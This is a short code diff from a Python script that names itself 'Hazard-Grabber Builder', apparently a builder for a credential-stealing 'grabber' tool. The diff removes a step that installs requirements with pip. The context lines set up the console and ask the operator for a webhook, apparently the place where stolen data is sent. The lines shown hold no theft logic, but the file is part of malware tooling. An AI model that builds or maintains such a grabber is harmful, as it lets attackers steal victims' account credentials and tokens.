@@ -9,11 +9,6 @@ from win10toast import ToastNotifier
 os.system('title Hazard-Grabber Builder')
 os.system("color b")
 os.system("cls")
-print("Installing requirements...")
-time.sleep(1.5)
-os.system("pip install -r requirements.txt")
-os.system("cls")
-os.system("color b")
 
 webhook = input("What is your webhook? ")
 
